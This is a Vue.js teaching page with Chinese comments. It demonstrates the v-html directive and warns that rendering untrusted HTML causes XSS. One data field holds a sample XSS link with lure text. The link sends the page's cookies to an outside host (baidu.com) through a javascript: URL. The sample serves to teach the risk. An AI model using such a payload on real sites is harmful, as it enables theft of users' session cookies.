<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta http-equiv="X-UA-Compatible" content="IE=edge">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title></title>
    <!-- 引入Vue，将有一个全局的 Vue 构造函数 -->
    <script src="../js/vue.js"></script>
</head>
<body>
    <!-- 
        v-html指令：
            1. 作用：向指定节点中渲染包含 html 结构的内容
            2. 与插值语法的区别：
                (1) v-html 会替换掉节点中的所有内容，{{xxx}} 则不会
                (2) v-html 可以识别 html 结构(解析标签)
            3. 严重注意：v-html有安全性问题
                (1) 在网站动态渲染任意 html 是非常危险的，容易导致 XSS 攻击
                (2) 一定要在可信的内容上使用 v-html，永远不要用在用户提交的内容上！
    -->

    <!-- 准备一个容器 -->
    <div id='root'>
        <div>你好，{{name}}</div>
        <div v-html="str">his</div>
        <div v-html="str2"></div>
    </div>
    <script>
        Vue.config.productionTip = false;   // 阻止 Vue 在启动时生成生产提示

        new Vue({
            el:'#root',   
            data:{        
                name: 'Tom',
                str: '<h3>Hello</h3>',
                str2: '<a href=javascript:location.href="http://www.baidu.com?"+document.cookies>兄弟我有你在找的资源！</a>'
            },
        })
    </script>
</body>
</html>
